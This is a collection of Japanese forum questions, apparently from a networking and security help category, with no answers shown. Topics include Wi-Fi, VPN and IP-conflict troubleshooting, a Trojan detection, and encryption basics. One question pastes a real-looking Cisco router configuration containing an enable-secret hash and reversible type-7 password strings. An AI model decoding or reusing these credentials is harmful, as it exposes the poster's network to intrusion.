　私は大学の理工学部の情報工学科に所属している者で、アドホックネットワークを研究している研究室に配属され、卒業研究として「隠れ端末問題」を研究することになりました。 　研究室の教授の話を聞いていると、隠れ端末問題は、理論を中心に研究するテーマというよりも、ネットワークシミュレーションの利用を中心とした研究テーマのように思えます。 　しかし私は隠れ端末問題の研究を、理論の方面から研究、即ち理論的なアプローチで研究したいと思っています。 　そこで、インターネットで様々な論文を検索してみたのですが、ほとんどがネットワークシミュレーションを中心とした研究で、理論的なアプローチをしている論文はありませんでした。 　先輩曰く、ネットワークシミュレーションを中心とした研究には非常に高度なプログラミング能力が必要とされ、優秀な先輩でもシミュレータを使えるようになるまでに１年かかったそうです。卒業研究は今年度中に終わらせなければならないので、プログラミングが苦手な僕には到底出来ません。 　そこで隠れ端末問題やその類の問題に詳しい方に聞きたいのですが、隠れ端末問題を理論の方面から研究する内容や方法は無いのでしょうか。教えて頂けると非常に助かります。
プラネックス社プリントサーバーMZK-SP300N2について質問です wordで文章を作成しました。印刷を実行すると、作成した文章のほかに、（1枚を印刷）2枚にわたって、以下の不必要な印刷物がプリンタから印刷してでてきます。 ファイル名、フォルダ、表題、副題、作成者、キーワード、・・・・・・単語数、文字数まで18項目のワードで作成した履歴というか、余分なものが、印刷されます。 これを、印刷させない方法が、プリンタのプロパティのところか、どう設定したらよいかご存知の方はいらっしゃいますか、用紙の無駄にもなり、文章を印刷するたびにこのようになって 困っています。よろしくお願いします ちなみに、osはwin xp sp3,printerはキャノン　MP-600です。
会社と家で無線でインターネットを使用しています。 設定をその都度、切り替えしないといけません。 会社は、自動で利用できず、手動でIPアドレスをいれてます。 何か、よい方法ありませんか？
トロイの木馬に感染したのでしょうか？ エッセンシャルを使っているのですが、１０分おきくらいに「潜在的な脅威がエッセンシャルによって１個検出され、その項目は一時停止されました。」 と表示されるので、したにある、コンピューターから除去というボタンをクリックしたら、３秒くらいすると、コンピューターから除去されました。 と表示されます。でも、また１０分後くらいに、「潜在的な・・・・・」が出てくるのでどうしたらいいのか困っています。誰か助けてくれませんか？ 一応アバストの無料のやつは、インストールしたのですが、使い方がいまいちわかりません。トロイの木馬に感染したのか、それとアバストのトロイの木馬除去についてご説明をお願いします。 項目：Torojan:JS/IframeRef　警告レベル：重大 カテゴリ: トロイの木馬 説明: このプログラムは危険であり、攻撃者からのコマンドを実行します。 推奨される操作: このソフトウェアをすぐに削除します。 プライバシーを侵害する、またはコンピューターに損害を与えるおそれのあるプログラムが Security Essentials によって検出されました。これらのプログラムが使用するファイルを削除せずに引き続きアクセスすることができます (推奨されません)。これらのファイルにアクセスするには、[許可] 操作を選択して [操作の適用] をクリックします。このオプションを使用できない場合は、管理者としてログオンするか、セキュリティ管理者にお問い合わせください。 と表示されます。そのほかは良くわかりません。
トロイの木馬に感染したのでしょうか？ エッセンシャルを使っているのですが、１０分おきくらいに「潜在的な脅威がエッセンシャルによって１個検出され、その項目は一時停止されました。」と表示されるので、したにある、コンピューターから除去というボタンをクリックしたら、３秒くらいすると、コンピューターから除去されました。と表示されます。でも、また１０分後くらいに、「潜在的な・・・・・」が出てくるのでどうしたらいいのか困っています。誰か助けてくれませんか？一応アバストの無料のやつは、インストールしたのですが、使い方がいまいちわかりません。トロイの木馬に感染したのか、それとアバストのトロイの木馬除去についてご説明をお願いします。
http://www.safetv.me/watch/9vsh7WNgY1Q/%E6%90%BA … youtubeにこのようなものがありましたが、簡単に盗聴できてしまうことに驚きましたが、このような盗聴は今や日本でも可能なのでしょうか？
ネットワークプリンタのIPを設定しようとしと以前使って今は使っていないIPを割り当てようとしたところ IPの重複によるエラーが出たため設定できませんでした。 IP:192.168.1.235 （このときはpingの返信はなし） しかし本日pingを実行したところ返信があり、 macアドレスを調査したのですが対象の機器が見当たりませんでした。 macアドレスの最初の６桁は、00-80-92で JAPAN COMPUTER INDUSTRY, INC.と判別できましたが対象の機器が不明です。 NICメーカは、Silex Technology.Inc.　サイレックスです。 対象のIPを使用できるように今の設定を削除か無効にしたいのですが、何か良い手はありますでしょうか。 PCのIP割当は動的で192.168.1.11～192.168.1.170までとしています。 プリンタはのIP割当は静的で192.168.1.221～192.168.1.1239までとしています。 ご教授願います。 ※プリンタサーバのファイルメニューからサーバのプロパティ欄にTCP/IPポートが残っていて、削除しようとすると「要求されたリソースは使用中です」となります。 スプールは空の状態です。 プリンタサーバの再起動は年に１回のビルの停電のときのみです。 以上、宜しくお願い致します。
初歩的な質問ですいません。 ■構成 　　ルータA-----------------ルータB-----------------ルータC ■条件 　　－ルータA・・・ジャンボフレーム対応(9000バイト) 　　－ルータB・・・ジャンボフレーム非対応 　　－ルータC・・・ジャンボフレーム対応(9000バイト) 上記場合、ルータAからルータCに対し9000バイトのフレームを送信した場合、通信が可能でしょうか。(ルータBがジャンボフレーム非対応なので、ルータAでフラグメントして送信するのか気にしています） よろしくお願いします。
最近気づいたことなのですがファイアーフォックス以外のブラウザが使えなくなりました。　 IEは「Internet Explorer ではこのページは表示できません」と表示され、接続の問題を診断しても原因がわかりません。　 またiTunesでは「iTunesは、iTunes　storeに接続できませんでした」と表示されます。　 またFlash Playerやその他のソフトなどはインストールができない状態です。　 　 そして今ファイアーフォックスは普段通りインターネットを使う分には問題はありませんが、画像やZIPファイルをダウンロードしようとするとフリーズしてしまい強制終了することになってしまいます。　 多分ダウンロードマネージャーが表示されるとフリーズすると思います。　 どうすればこれらの問題が解決できますか？
wiresharkの使い方として、 インストールされたPCのパケットを拾うのは当然ですが、 同じセグメントのネットワーク内に流れているパケットを拾うことは可能でしょうか？ PC(wireshark) ｜ HUB - 機器A ｜ 社内LAN ｜ WAN 機器AからWANに流れるパケットをPC(wireshark)上でチェックすることは可能でしょうか？
FMV-BIBLO MG70Gを使用してますが、(1)無線ＬＡＮのアップデートについて。　(2)Ｗｉ－Ｈｉに登録した所セキュリティーがＭＥＰでなく新しい物でした。　新しい方法に対するアップデートがしたいのですが。
ADSLを使用していますが、回線スピードが上がらないので ＷＩＭＡＸを考えています。（現在下りは1Ｍを切るほどです） そこでWiMAXのホームタイプの室内での使用状況を知りたく 投稿しました。 例えば　窓際に置かないと駄目、あるいは雨戸を閉めるよくない等 どういう事に注意されて使用されているか、お教え下さい。
私は未成年なのですが、アダルトcityというサイトのアダルト動画投稿cityというサイトに入場してしまいました。無料サイトらしいです。 どうしても見たかった動画のタイトルで検索すると、このサイトが出てきたのでクリックすると、いろいろ文字が出てきて動画が再生されました。そのときは音声だけ再生されていたので、怖かったから前のページへ戻るとその動画が普通に再生されていました。文字も出てきません。 これはなぜでしょうか？ そしてパニックになって、退場ボタンみたいなのを押そうとそのサイトのホームにいくと、18歳以上入場ENTERと書いてある赤くて大きめのボタンがありました。 とにかく焦っていましたので、ボタンが赤いというのもあって18歳以上入場が18歳未満退場と間違えてしまい、押してしまいました。 するといろいろHなものが出てきたのですが、右上の×ボタンを押してすべてのページを閉じました。 これではまだ退場できていないと思い、それから２、３回そのサイトへアクセスしたのですが退場のボタン見た感じでは無かったです。 本当に情けないことをしたと思っています。 これからトラブルにあったりしないでしょうか？ 本当に不安で何も手につきません。 今はメールがくるとかそのようなことはないのですが大丈夫でしょうか？
ネットワークセキュリティ関連の勉強をしています。 お客様に各ＰＣ上にインストールするいわゆる一般的なセキュリティソフトの販売をしているのですが、競合他社はまったく種類が違った形で提案しているようです。その他社の提案商材が私の知識不足で理解出来ておりません。 ■ユーザー環境／状況 ・インターネット接続しているＬＡＮと接続していないLANをVLANで島分けしている。 ・インターネットへの出口は１ヶ所だけ。 ・今回要望があったのはインターネット接続ＰＣのアンチウイルスソフトの更新期限が近づいてきているので法人向けのクライアントPC用のアンチウイルスソフトを各PC台数分だけ提案した。 ■競合他社の商材 以下、お客様に聞いた情報になります。 ・お客様のネットワーク環境にはなにも設置しない。（ＵＴＭなどを入れるわけではない） ・すべてのＰＣにアンチウイルスソフトは何もインストールしない。 ・外部のネット上にセキュリティ用のサーバーを借りてそこからインターネットアクセスする。 ※ネットワークセキュリティについてはあまり詳しくないお客様から得られた情報なので足りない点や間違っている点もあるかもしれまん。 ■質問事項（疑問点） １．”外部のネット上にセキュリティサーバーを立ててそこからアクセス” これってどういうサービスなのでしょうか？クラウド上でのプロキシサービスみたいなものがあるのでしょうか？ ２．そのような商材があるとして、プロバイダのセキュリティ対策オプションとなにか違いがあるものなのでしょうか？ ３．”ＰＣ上にアンチウイルスソフトを入れない” これだとＵＳＢなどから感染するリスクは取り除けないと思うのですが、それすら可能なサービスがあるのでしょうか？ ４．以上の内容から、競合他社が出しているであろう商品を教えていただきたいです。また、具体的なメーカー/サービスもあるのならそれもお願いします。 よろしくお願いします。
いま、NETGEARのルーターを 使ってるのですが最近電波が弱くなったので 買い換えようと思います。 xbox360で使うので 電波が強い方がいいのですが ポン付けで使えるルーターないですかね？ ルーターは一階でxbox360は二階です よろしくお願いします。
microsoft security client を初めて使用したいと思ってますが悩んでいます。使いかってや安全性？について教えて下さい。今まではカスペルスキーを使用してました。現在、試用版を使ってます。
今海外に住んでいるのですが パソコンのメールを使って日本の携帯au docomoにメールが送れません。 色々調べてみたのですが、 相手の携帯がパソコンの受信を拒否している可能性は大いに考えられます。 ですが、メールでしか相手と連絡手段がなく、伝えられずに困っています。
L3スイッチ１台で３つの異なるネットワークを相互間通信できるようにしたいと考えています。 イメージとしては VLAN(1)　⇔　VLAN(2)　OK VLAN(2)　⇔　VLAN(3)　OK VLAN(1)　⇔　VLAN(3)　NG というようにできればと考えています。 そもそもL3スイッチ１台で実現できるのかもわかっていません。 ほぼネットワークに携わったことが無いので教えていただけると非常に助かります。
ScreenOS(NetScreen)をIPv4、IPv6のデュアルスタックで運用しています。 set admin manager-ip コマンドで管理用IPを制限しているのですが、IPv4アドレスしか設定することができず、IPv4の設定だけの設定ではIPv6アドレスは制限なく接続できてしまいます。 IPv6アドレスでの管理ポートへのログインを制限させる方法についてご教示頂けないでしょうか
初歩的な質問ですいません。 リンクダウン転送の機能(一方でdownを検知したら対ポートをdownさせる)については 理解したのですが、一方のポートがdownしたときに対向ポートをdownさせる目的は何なのでしょうか。正直、あまりリンクダウン転送でポートをdownさせる目的がわかりません。
遠隔地にあるPC（Windows7)にCiscoVPN クライアントソフト（5.0.00.0340）をインストールしました。 以下の接続を試みようとしています。 PC→FW(1)→（Internet)→FW(2)（SONICWALL）→CiscoVPN3005→サーバ FW(1)にNATトラバーサルは必須でしょうか？ FW(1)を扱う業者に仕様を伝えなければなりません。 教えていただけますでしょうか。 宜しくお願い致します。
ネットワーク関係に詳しい方！！ ネットワーク関係について詳しい片にご質問です。 自宅にて無線LANを利用しております。PC２台を使っていて、 もちろん、きちんと2台ともネットワークに接続ができます。 しかし、スマートフォン、ipod tuchやインターネット電話などの機器をネットワークに接続しようとすると、 接続ができません。 パスワードはあっているはずです。 なにか原因分かる方おりますか？ それともパスワードが間違っているのでしょか？ どなたか回答よろしくお願いいたします
この前、試しにネットワークカメラを使ってみたのですが ポート番号を80から8080に変えて使用はできたのですが、 別のポート番号（たとえば8081等）に変えると接続できなくなりました。 何か考えられる原因をご存じの方、ご教授ください。 よろしくお願いいたします。 ちなみに、 ・192.168.0.xの内部ネットワークで、外部との接続はありません。 ・ＰＣからIEでｈｔｔｐ：//192.168.0.9:8081のように入力して確認しました。 ・ネットワークの問題かなと思い、別のＰＣに簡易httpサーバーをインストールして 　ポートを番号8082等で試しましたがこれは通常に接続できました。 ・念のため、PC のファイアウォールを停止して確認しましたがダメでした。 ・ネットワークにはＰＣ２台とカメラとルーター以外は何もありません。 よろしくお願いいたします。
FireFoxでProxyを適用した場合、ブラウザのみにプロキシが反映されるのでしょうか。それともSSHなど他のネットワーク通信にもProxyが反映されるのでしょうか。
RHEL5のsshd のサーバへクライアントPCから接続するときに、特定のユーザーのみsftp接続を拒否したく、sshd_config の DenyUsers にて指定してsftp接続を拒否することができました。 ただ、対象ユーザーにsftp接続は拒否しつつ、ssh接続は許可したいのですが、何か良い方法はないでしょうか。 よろしくお願いします。
基本情報等で習う暗号化についてなのですが 鍵を使って暗号化するというのは理解できるのですが では実際に使ってみましょう、となるとどうすればいいのかさっぱりです。 他にもいろいろと疑問があるのですが 例えば・・・ １、メモ帳やWordを使って文章を書いた、これを友達に送りたいが公開鍵で暗号化して送りたい！どうすればいいのか？ ２、仕事で顧客にメールを送りたいが、暗号化したい。どうすれば？ ３、そもそも鍵の作り方ってどうすればいいのか？ 　　個人利用であれば何かソフトをインストールして作るのか。 ４、企業などでは自社独自に鍵を生成するサーバみたいなのがあるのでしょうか？ 技術的な話や論理的な話は、どの本やサイトにも解説があるのですが 実際に使う方法などの説明が全然見つからなく、全然イメージがわかないのです。 暗号化ソフトみたいなものに、暗号化したいテキストファイルを読み込ませて 鍵作成ソフトで作った鍵を指定する・・・みたいな使い方なんでしょうか？ 複合の仕方も具体的に知りたいです。
今さっきまでYouTubeで動画を見ていたのですが… 他のページに移動したとたん インターネットに繋がらなくなってしまいました。 パソコンは初心者なので全くわかりません。 画面にはインターネットエクスプローラー(?)ではこのページは表示できません って書いてあって 画面の右下のアンテナのマークに太陽みたいなマークがついたり たまに×のマークがついたり してます。
isoやROMのダウンロードは海外のサイトからダウンロード だと違法にならないのですか?????????????
VirtualRouterでスタート押すとcould not be startedって出るんですけど、どうすればいいですか？
来季より、会社でGoogle appsの導入を検討しています。 社員数が約200名、仕事上メールでクライアント情報をやり取りすることがあるためメール誤送信による情報漏洩を懸念しております。 そこでおすすめのメール誤送信対策やサービスを教えて下さい。 よろしくお願い致します。
セキュリティホールを作らないための動的ページ制作について優秀な参考書の購入を考えています。MYSQLとPHPを活用した動的なページは既に制作済ですが、怖くて公開することができません。
ネット盗聴の被害に遭っています（100％確信しています）。以下の被害内容で警察に動いてもらえるでしょうか？ ・ライブ掲示板などにほのめかしを書かれる ・動画ファイルを削除される ・あるサイトのIDを使っていたずらをされる パソコン初心者なのですが、手続きは難しくて大変なのでしょうか？警察にやってもらえる、またはPC業者に頼めばやってもらえるのでしょうか？ お願いします。
無線LANを使っているのですが、自分が使っているパソコンのインターネットの接続がおかしくなってしまいました。 今までは全然問題なく使えていたのですが、今はインターネットの接続ができません。しかし、Skypeや学校のメールサイトだけはインターネットをつかって利用することはできます。それ以外のサイトは全く見れません。 試しに有線にしてつないでみましたが、無線時と同じく全くつながりませんでした。 ちなみに他のパソコンやスマートフォンではちゃんと無線LANを利用できます。 自分が使っているパソコンはFMV NF/D50というものです。 回答よろしくお願いします。
最近、ポイントサイトというものを知り利用してみました。 色々な不正があるのか、さまざまなルールがありましたが 技術的にどうなのか疑問があったので質問させてください。 あるサイトでは同一IPアドレス内でも別のコンピュータから なら複数のアカウントを取れる(コンピュータの台数だけ作れる。)という 規約でした。 そこで、疑問に思ったんですが一つのグローバルIPアドレス内でルーターを通して 複数のコンピュータがある場合、それぞれのPCがCookieを削除していたとしても それらを特定し識別する事は可能なのですか？ 今まで、Cookieを削除した状態でホームページを訪問したりするだけでは IPアドレスとポート番号、ブラウザの種類とバージョン程度しか判らない ものと思っていました。 しかし、これらはどのようにして判別しているのですか？ 接続しているコンピュータ名やログインしているユーザー名を 表示できるのですか？ マイクロソフトなどの製品を購入している状態ならシリアル番号から識別できるとは 分かりますが、ログインもしていなくCookieも無い状態なのが不思議です。 今までそのような事ができるとは思っていませんでしたので、驚きと 奇妙さでいっぱいです。 よろしくお願いします。
我が家には　acerのノートＰＣ　ASPIREone（ＯＳは　win7)と デスクトップＰＣ　NEC　VW700GG(OSはＸＰのpack3）があり　 ＥＭでネットしてます。デスクトップＰＣには　ロジテックのＵＳＢをさして　ワイヤレスで ネットできるようになりました。あとは　複合プリンタもワイヤレスで　印刷できないかと思っています。 現状は　ノートＰＣをプリンタのところまで持っていって　USBケーブルをつないで印刷しています。 家には有線ルータcoregaのCG-BARMX3もあります。（今は使用してない） 複合プリンタは　SHARPのUX-MF70CLです。 もしルータのＬＡＮ差込口に　ワイヤレスを受信できる何かを差込、ルータとプリンタをＬＡＮケーブルで つないだら　無線で印刷できるんじゃないかな？って考えてます。それができると　デスクトップPCからの印刷も可能になるって思うんです。 無理でしょうか？
昨日の夜、AM2時過ぎに、ふと仕事でし忘れたことに気づき 店に戻りました。 セコムの解除の鍵を持たされているので、普段通り解除して 店に入ったのですが(路面店です)、入って数十秒くらい?で 電話がありました。 真っ暗な店に電話が鳴り響いたので一瞬ひやっとしましたが、 電話はすぐに鳴りやみ、セコムからだと思い、すぐに自ら かけなおしました。 そして要件を伝え、セコムの方から店の名前と自分の名前をきかれたのですが、 これって会社の本部とか、店舗とかに後日通知みたいなのってくるのでしょうか？？？ 自分の凡ミスで戻ったので上司には知られたくないのですが。。。 過去にセコムの誤作動で(店内の掲示物が剥がれ落ちるなど)、翌朝 店に来たらセコムから通知の紙が置いてあることはあるのですが、 今回のように店に人がいて電話に対応できた場合はどうなのでしょうか。。。 とても気がかりでなりません。 わかる方いたら回答お願いいたします。
外国の人からノートパソコンを譲り受けましたが、無線らんなので、コードに設定したい。
仕事上のやり取りで、エクセルで作成した名簿のやり取りをメールで行なう予定です。 （名簿の書式：(1)所属と名前、生年月日の一覧と(2)所属と名前の２通り） メールでエクセルで作成した名簿のやり取りをするため、セキュリティ面で十分な対応をしたいのですが、暗号化するシステムを発注するコストが無い為、以下の方法を検討しています。 １）エクセルの読み込みと書き込みパスワードを設定する。 　　※１）のパスワードは、先方に事前に郵送で送る。 ２）作成した名簿は、入力されたセルを非表示にし、シート保護（パスワード設定）を行う。 　　※２）の操作は、マクロを設定し、非表示にするシートの非表示になる部分にボタンを設置する。VBAからパスワードが判明しない設定とする。 上記の操作で、検討しています。 お金をかけずに、セキュリティ面で十分な対応ができる方法で、名簿を送る側（お客様側）に手間がかからない良い方法があれば、教えてください。
ウィルスを手に入れるにはどうすればいいのですか？
はじめまして。 画像を右クリックすると、写真のような表示が出てきて、画像を保存することができません。 どうしたら画像を保存することができるのでしょうか? どうか教えてくださいm(__)mよろしくお願いいたします。
済みませんが質問させてください 自宅にてVPNを勉強の為に設定しているのですが設定につまづいております。 色々なサイトを参考に外から自宅にある家のCISCOルーターのWANインターフェイスに到達、認証されIPアドレスの振り分けまで行われるのですが何故かその後リモートクライアントとルータ以下のLAN側と一切通信が出来ません。。。 リモートPCから見て リモートPC -----------(ok) Cisco Router(NG) ----------- 自宅LAN 尚自宅内LAN側からもリモートPCに対してPing出来ません。 色々調べて、NATがいけないのかもしれないとゆう線はあるのですが自信がありません。 もし、何かアドバイスいただけるようだと非常に助かります。 version 12.4 no service pad service timestamps debug datetime msec service timestamps log datetime msec service password-encryption ! hostname 861K ! boot-start-marker boot-end-marker ! logging message-counter syslog logging buffered 4096 enable secret 5 $1$pBlp$SruXmzFNvUy2xoiRvgU8H. ! aaa new-model ! ! aaa authentication login AUTHE local aaa authorization network AUTHO local ! ! aaa session-id common ! ! ip source-route ! ! ip cef ip domain name sugarskull.local ! ! ! ! username xxx password 7 104D000A0618 username xxx privilege 15 password 7 020507550A050C2F5C ! ! crypto isakmp policy 1 encr 3des hash md5 authentication pre-share group 2 ! crypto isakmp client configuration group VPNCLIENT key xxx dns 192.168.11.3 domain sugarskull.local pool ezremote acl 104 save-password crypto isakmp profile VPN-PROFILE match identity group VPNCLIENT client authentication list AUTHE isakmp authorization list AUTHO client configuration address respond ! ! crypto ipsec transform-set REMOTE-IPSEC esp-3des esp-md5-hmac ! crypto dynamic-map REMOTE 1 set transform-set REMOTE-IPSEC set isakmp-profile VPN-PROFILE reverse-route ! ! crypto map EZVPN 1 ipsec-isakmp dynamic REMOTE ! archive log config hidekeys ! ! ip ssh version 1 ! ! ! interface FastEthernet0 ! interface FastEthernet1 ! interface FastEthernet2 ! interface FastEthernet3 ! interface FastEthernet4 ip address dhcp ip nat outside ip virtual-reassembly duplex auto speed auto no keepalive crypto map EZVPN ! interface Vlan1 ip address 192.168.11.1 255.255.255.0 ip nat inside ip virtual-reassembly ! ip local pool ezremote 192.168.11.201 192.168.11.210 ip default-gateway 124.32.48.27 ip forward-protocol nd ip route 0.0.0.0 0.0.0.0 dhcp no ip http server no ip http secure-server ! ip nat inside source list 1 interface FastEthernet4 overload ! access-list 1 permit 192.168.11.0 0.0.0.255 access-list 104 permit ip 192.168.11.0 0.0.0.255 any ! control-plane ! ! line con 0 password 7 15220A1F173D24362C62 no modem enable line aux 0 line vty 0 4 privilege level 15 transport input telnet ssh ! scheduler max-task-time 5000 end もうかれこれここで１週間以上詰まっています。 もしお時間ありましたら助言いただけますでしょうか
こんにちは。 インターネット利用の制限・監視をする、i-フィルターというソフトがあるそうですが、自分の使っているＰＣにi-フィルターが設定されているかどうか知りたいです。 どこを見れば、それが分かりますか？ ネットサーフィンをしていても、「i-フィルターによって閲覧を禁止されています。」というようなメッセージは出てきた事が無いので、閲覧制限はされていないと思うのですが、監視（自分のインターネット利用の履歴を勝手に他のＰＣに送信されていたり、等）をされていないかどうかが気になります。 Ｃドライブの中に、iFilterというフォルダがある事と、去年の１０月頃から、ＰＣの電源を付けてしばらく経つと、ほぼ例外なく「制限付きアクセス」という接続状況になり、インターネットへの接続が切れてしまう、という点で、i-フィルターとの関連が気になりました。 ちなみに、ＰＣは自分で買ったもので、（多分）自分以外の誰かが触った事は無いと思います。遠隔でi-フィルターを設定する、という事は可能なのでしょうか。 例えば、同じ無線親機を利用している他のＰＣを通して、等。 ＰＣに関して初心者なのですが、宜しくお願い致します。
SSLメール送受信時の証明書について、教えてください。 「Microsoft Outlook 2007」において、某サーバーに設置させていただいている、独自ドメインから、取得させていただいているメールアドレスを、SSLメール送受信という形で、設定させていただいております。 その際に、「Outlook 2007」を立つ上げて、最初の送受信をする時に、必ず、「接続しているサーバーは、確認できないセキュリティ証明書を使用しています。対象のプリンシパル名が間違っています。」というメッセージが表示されます。 その時、「このサーバーの使用を続けますか？」で、「はい」ボタンを押下すれば、終わる事なのですが、出来れば、１度も表示されないようになれば、すっきりいたします。 証明書の情報は、「発行先：localhost」「発行者：localhost」となっております。 「このCAルート証明書は信頼されてりません。信頼を有効にするにはこの証明書を信頼されたルート証明機関のストアにインストールしてください。」とも書かれておます。 どのようにすれば、よろしいでしょうか？ 某サーバーのユーザーサポートに、質問させていただいても、正確にお答えいただく事は、難しい状況です。 お手数をおかけいたしますが、よろしくお願いいたします。
はじめて質問させていただきます。よろしくお願いいたします。プロフィールを作る前にFecebokの登録作業に入ってしまい第二ステップ友達を探すで私のPCの中の全関係メールに招待状が送られました。私の誤作動ですが・・・知人に非常識すぎると・・・一斉メールをして謝るべきと・・・どのようにすれば送り先をさがして謝罪ができるでしょうか。 教えて頂けないでしょうか。
よろしくお願いします。 NW機器のポートの使用率（帯域使用率？）を監視したいと思います。 SNMPマネージャから、NW機器に対してSNMPポーリングを実行し fInOctetsを取得します。 そこでfInOctetsの前回取得値と、今回取得した値の差分値を計算すれば、 使用率を出すことは可能なのでしょうか？。 差分値から使用率・・というのがどうもピンときていないのですが・・
社内で新しいパソコンを導入してLANは正常に組めてファイル共有なども可能となり、ウィンドウズアップデートも行え、メールの送受信も可能になりました。しかし、ネットブラウザを使用してのホームページの閲覧だけが全くできません。標準搭載されているIE９を立ち上げた瞬間に”ページを表示することはできません”のエラーが表示されます。OSは、Windows7 HomePremium x64 。次の設定は試してみました。ウィルスソフトをすべてアンインストール、Windowsファイアーウォールのオフ、ローカルエリア接続のオンオフ、ローカルエリア接続プロパティにてIPv6のチェックを外す、セーフモードとネットワークにて起動、ネットワークアダプタのファームウェア最新化、FirefoxやSafariなど他OSの試用。これらを試してみても症状は変わりませんでした。デバイスそのものの不調としか思えないのですが、可能性として確認した方がよい作業があればご教授願います！m(_ _ )m
以前させて頂いたご質問に、進展がありましたので また新たにご質問させて頂きます。 まず、事のあらましです。 当方のメールアドレス（ここではAとします。）に以前、 メルマガを装った迷惑メールが届きました。 当方、うっかりそれを開いてしまいました。 が、セキュリティソフトがそれを処理してくれたようでもあり…。 そこらへんはよくわかりません。 （ただ、「Web脅威、処理数：１」と出ました。） その後、ある通販サイトで買い物をしたのですが、 その通販サイトに登録していたメールアドレスが、 例の「A」のメールアドレスで、 その「A」のメールアドレス宛てに、通販サイトから 「ご注文ありがとうございました。住所、名前等（←当方の）…に発送致します。」 のメールが届きました。 そしてその次の日、 セキュリティソフトの検索結果に、 「脅威は検出されませんでした（検出数：０）」とは出たのですが、 「削除されたブラウザCookie:1」と出ました。 「Cookieの説明」には、 「Cookie（追跡CookieやブラウザCookieとも呼ばれます）は、小さなテキストファイルで、 アクセスしたWebサイトから転送されてお使いのコンピュータに保存されます。 Cookie自体は危険なものではありませんが、 スパイウェアに利用されてプライバシーが脅かされる可能性があります。」 と、書いてあります。 その、「削除されたブラウザCookie:1」の詳細を表示すると、 ファイル「serving-sys.com」タイプ「Cookie」処理「削除済み」と出ます。 これは、前日に通販サイトから私の個人情報が入ったメールが、 例の「A」のメールアドレスに届いたことと、何か関係があるのでしょうか？ 「Cookieの説明」の中の 「Cookie自体は危険なものではありませんが、 スパイウェアに利用されてプライバシーが脅かされる可能性があります。」 この部分が、非常に気になります。 とにかく、当方が心配している事、ご質問したい事というのは、 もし、最初に来たメルマガを装った迷惑メールに、 不正プログラムなどが仕込まれていた場合、 その後で通販サイトから来た 当方の個人情報入りのメールの中身を、 迷惑メールを送った人間が、 把握（はあく）することが可能でしょうか？ その次の日の「削除されたブラウザCookie:1」というのは何か関係あるのでしょうか？ と、いうことです。 長くなりましたが、 ご教示のほうを是非ともよろしくお願い致します。m(__)m
会社と出張先でPPTPで接続しましたが、 速度が異常に遅くて15K/秒程度しかでません。 会社はブロードバンドルータのPPTPサーバ機能を利用し、 出張先ではWin 7にて接続しています。 ipconfigでPPTP接続の状態をみたらデフォルトゲートウェイが 0.0.0.0になっていて、それが少し気になったのですが、 ゲートウェイに関しては「リモートネットワークでデフォルトゲートウェイを使う」 となっており、それ以外に設定できるところが無いので それが原因なのかも不明です。 このような状態なのですが、解決方法などありますでしょうか？ お詳しい方どうかよろしくお願いいたします。
自分がネットワーク、セキュリティの知識をマスターしたい。５－６年前、自宅で、P4などのデスクトップPCは数台、ルータ3-4台、RJ-45ケーブルで数個のサブネットを作り、PCサーバーだけでなく、ネットワークも組んで、そこでメールサーバー、DNS等を立ち上がって、ping、nslookup等色々ネットワークテストをしました。（今も残っている） 今は時代が変わり、i7、8GBのノートを買いました。このノートは、PCサーバーとしてできますか？デスクトップだと、三つのLANインタフェースもできるげと、ノートでは、どうやって拡張でしょうか？他のデメリットはないでしょうか？ 両方を比べて、やはり古いP4のデスクトップのサーバーのほうが良い？目的はネットワークの実験環境を作るだけで、他の代わった良い方法はありますか？
詳しい方、ご教示をお願い致します。 上り下り最大１００Mbpsの光フレッツに加入しています。 東京→埼玉間でデータの更新をした場合、 どのくらいの遅延時間があるのでしょうか？ （1秒ぐらいの遅延ですか？１マイクロ秒ぐらいの遅延ですか？） 上り下り最大1Gbpsにした場合、遅延時間は短くなりますか？ それとも遅延は、距離には関係しないのでしょうか？
最近ＰＣのネットがおかしくなりました。 アドレスを打ち込んだら普通ならそのサイトが表示されますよね？ けれど半分ぐらいの確率でそのサイトではなく宣伝サイトに行ったりします。 ＰＣに詳しくないので説明しにくいのですが アドレス打ち込み→そのサイトが表示 が、どういう理屈でそうなるのか分かりませんが アドレス打ち込み→宣伝サイトがわりこんできて表示 となります。 画像は表示されるサイトのＳＳです。 Cookieｔかを削除しても効果がありませんでした。 ＯＳはVistaでＩＥは８です。 治す方法を知りませんか？ よろしくお願いします。
会社内で２０台近くのパソコンをネットワーク接続しています。 OSもWin2000、WinXP、Win7、MACと様々です。 普通に使っている分には問題なのですが、時々それぞれのネットワークPCに接続できなくなります。 マイネットワークのネットワーク全体から新規に作ったグループに接続して使っています。 その時は、接続しているパソコンを全て電源を落としてから再度立ち上げるといつの間にか接続できるようになります。 以前聞いた話ですが、ネットワーク内にIPアドレスを管理するPCが勝手に作られて、そのPCがトラブルを起こすと全体の接続が出来なくという話を聞きました。 また、このIP管理のPCは指定することができず、どのPCがIP管理をしているか見つけられないとも聞きました。 この辺の情報をお持ちの方何かよい解決法を教えてください。
最近ＰＣのネットがおかしくなりました。 アドレスを打ち込んだら普通ならそのサイトが表示されますよね？ けれど半分ぐらいの確率でそのサイトではなく宣伝サイトに行ったりします。 前にポッアップで許可を求められたのですが よく考えずに許可をクリックしたのが原因かと思うのですが、 これって治せますか？ ＯＳはVistaでＩＥは８です。
新規機器はつけた覚えがないですが 突如、IP　192.168.11.4を割り振っているPCにIP重複エラーがでるようになりました。 エラーログをみると、MACアドレス 00:E0:C3～　ベンダーは 00-E0-C3　SAKAI SYSTEM DEVELOPMENT CORP. と分かるのですが、これが何の機器か分からなく…… 無線LANはMACフィルタしており、リストに00:E0:C3はないので 有線な気はするのですが。 無線もいれるとプリンタやらNASやらチューナやら30個ほどぶら下がっているので 確認するにも、まずアタリをつけたいなあって感じです。 ベンダー名でこの機器じゃね？って心当たりありましたら是非お教えください。 一応出来る限り固定IPをふっているハズで、システム変更ない状態で突然のエラー多発なので どっかの機器が故障/ファームエラー起こしてるんじゃないかなあ、と思っております…
社内ネットで使用している無線LANルーターのIPアドレスがわからず困っております。 その無線LANルーターを通した無線でのアクセスで、社内ネットに アクセス可能であることから、自局と同一セグメント内（/24）にあると推察できます。 MACアドレスは機器登録リストを社内で作成していたので分かっています。 セグメント内を0～255までpingスキャンしてみたのですが、 arp -aでそのMACアドレスがでてきません。ICMPブロックされていても arpで見ると出てくると思ったのですが…もしかしてセグメントが違うのか？ だとしたらなぜアクセスできるのか… 上記のような状態で、MACアドレスからIPアドレスを割り出す方法がありましたら 教えて下さい。
